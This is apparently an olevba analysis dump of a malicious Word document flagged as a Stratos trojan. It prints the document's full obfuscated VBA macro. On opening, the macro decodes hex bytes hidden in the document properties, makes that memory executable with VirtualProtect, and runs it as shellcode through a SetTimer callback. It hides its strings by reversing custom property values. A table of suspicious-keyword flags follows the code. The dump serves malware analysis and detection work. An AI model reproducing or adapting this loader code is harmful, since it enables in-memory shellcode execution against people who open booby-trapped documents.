olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Stratos.gen-27b4e13ed7aa70a9f78fbf07f024b577dd1a89649c535060981e3d257d62d8fc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Stratos.gen-27b4e13ed7aa70a9f78fbf07f024b577dd1a89649c535060981e3d257d62d8fc - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function LuthernsDecollimate Lib "user32" Alias "SetTimer" (ByVal FlakageFrameablenessGlobelet As LongPtr, ByVal TermlessnessSnigglers As LongPtr, ByVal SemipyriticCollagenous As LongPtr, ByVal UnamazedFarcilite As LongPtr) As LongPtr
Private Declare PtrSafe Function EmbarredAcademian Lib "user32" Alias "KillTimer" (ByVal DecampmentDespitefulnessAbdominocentesis As LongPtr, ByVal ContinuedRumblingUntoiled As LongPtr) As LongPtr
Private Declare PtrSafe Function SatyrinaeLeucophlegmacy Lib "kernel32" Alias "VirtualProtect" (ByVal PreconcertionInterdeal As LongPtr, ByVal UnpartiallyMunificence As LongPtr, ByVal ConhydrinKetchups As LongPtr, UnwaningUnstablerAstroite As LongPtr) As LongPtr
#Else
Private Declare Function LuthernsDecollimate Lib "user32" Alias "SetTimer" ( ByVal CoxalgiesExpedientWoolweed As Long, ByVal BambinoRuggyQuincunx As Long, ByVal GelilahExcerptionPreseasonal As Long, ByVal IntertergalVernaculous As Any) As Long
Private Declare Function EmbarredAcademian Lib "user32" Alias "KillTimer" ( ByVal VexillologistSupereleganceRhymes As Long, ByVal DesmocytomaNoyadeGoitered As Long) As Long
Private Declare Function SatyrinaeLeucophlegmacy Lib "kernel32" Alias "VirtualProtect"  (ByVal TelecommOutroared As Long, ByVal AnhelationDonors As Long, ByVal SambousePirayaBereave As Long, HepatotomyInamovableUnutilitarian As Long) As Long
#End If
Private Sub Document_Open()
SimlingPentaglotticalEglateres
End Sub
Private Sub SimlingPentaglotticalEglateres()
Dim KistvaenQuadrennial() As Byte
#If Win64 Then
KistvaenQuadrennial = IncompactnessMucronesUnrequested(ActiveDocument.BuiltInDocumentProperties(HLeh5P6ajzN("RWJxtc1u6")).Value)
#Else
KistvaenQuadrennial = IncompactnessMucronesUnrequested(ActiveDocument.BuiltInDocumentProperties(HLeh5P6ajzN("yaHJX7RXpe")).Value)
#End If
#If VBA7 Then
Dim WeirdishModificationistSubcranially As LongPtr
Dim CatesbaeaScranchTypewriting As LongPtr
Dim shellCode As LongPtr
Dim SurfeitednessQuadriportico As LongPtr
#Else
Dim WeirdishModificationistSubcranially As Long
Dim CatesbaeaScranchTypewriting As Long
Dim shellCode As Long
Dim SurfeitednessQuadriportico As Long
#End If
CatesbaeaScranchTypewriting = UBound(KistvaenQuadrennial) + 1
shellCode = VarPtr(KistvaenQuadrennial(0))
SatyrinaeLeucophlegmacy shellCode, CatesbaeaScranchTypewriting, 64, VarPtr(WeirdishModificationistSubcranially)
GetObject(HLeh5P6ajzN("LboosgBr4")).Environment(HLeh5P6ajzN("RAYlBJs3h"))(HLeh5P6ajzN("KHFYqmT8l")) = HLeh5P6ajzN("AxFHllSiP")
SurfeitednessQuadriportico = LuthernsDecollimate(0, shellCode, 1, shellCode)
EmbatholithicAnalogs 1
EmbarredAcademian 0, SurfeitednessQuadriportico
GetObject(HLeh5P6ajzN("sIS518Ia")).Environment(HLeh5P6ajzN("tATjy4E7s")).Remove (HLeh5P6ajzN("bckCGfOg8k"))
ReDim KistvaenQuadrennial(1)
End Sub
Sub EmbatholithicAnalogs(Finish)
Dim UnbemoanedImpeachabilityBroncos As Long
Dim SabazianismMorganize As Long
SabazianismMorganize = Timer() + (Finish)
Do
UnbemoanedImpeachabilityBroncos = Timer()
DoEvents
Loop Until UnbemoanedImpeachabilityBroncos > SabazianismMorganize
End Sub
Function LimpinessPhloreticEndarteritis(TilleringOverfrank, UnpackagedMerleJackals)
LimpinessPhloreticEndarteritis = Mid(TilleringOverfrank, UnpackagedMerleJackals + 1, 1)
End Function
Public Function HLeh5P6ajzN(strInput)
HLeh5P6ajzN = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function EffundFlaxweed(GoofierMougeotiaceaeOsteoarthritis) As Long
If Int(Rnd(23)) > 2 Then
EffundFlaxweed = 9000
Else
EffundFlaxweed = Len(GoofierMougeotiaceaeOsteoarthritis)
End If
End Function
Function IncompactnessMucronesUnrequested(ProsyFantasie)
ReDim SpoilsportYeasayer(EffundFlaxweed(ProsyFantasie) - 1) As Byte
Dim JeremiadColocolicTootinghole As Long, UnderemphasizeHellenistically As Long
Dim JabbedAnabathrumSpiffy: JabbedAnabathrumSpiffy = HLeh5P6ajzN("faWeWV3BP") & HLeh5P6ajzN("cGxBvSEkF3")
For JeremiadColocolicTootinghole = 0 To EffundFlaxweed(ProsyFantasie) - 1 Step 2
UnderemphasizeHellenistically = JeremiadColocolicTootinghole / 2
SpoilsportYeasayer(UnderemphasizeHellenistically) = CDec(JabbedAnabathrumSpiffy & LimpinessPhloreticEndarteritis(ProsyFantasie, JeremiadColocolicTootinghole) & LimpinessPhloreticEndarteritis(ProsyFantasie, JeremiadColocolicTootinghole + 1))
Next
IncompactnessMucronesUnrequested = SpoilsportYeasayer
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

